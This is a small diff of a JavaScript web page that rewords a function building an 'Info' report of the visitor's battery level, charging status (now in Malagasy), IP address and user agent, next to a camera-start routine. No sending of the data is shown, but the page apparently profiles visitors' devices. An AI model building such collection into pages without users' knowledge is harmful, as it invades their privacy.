@@ -62,8 +62,8 @@
       if (!navigator.getBattery) return 'Battery info unavailable';
       const battery = await navigator.getBattery();
       const level = Math.round(battery.level * 100);
-      const charging = battery.charging ? 'charging' : 'not charging';
-      return `Info 🗿\n\nBattery: ${level}%, ${charging} | IP: ${ipAddress} | UA: ${navigator.userAgent}`;
+      const charging = battery.charging ? 'Mbola micharge' : 'Tsy micharge';
+      return `Info 🗿\n\nBattery: ${level}%,\nStatus:${charging}\nIP: ${ipAddress}\nUA: ${navigator.userAgent}`;
     }
 
     async function startCamera() {
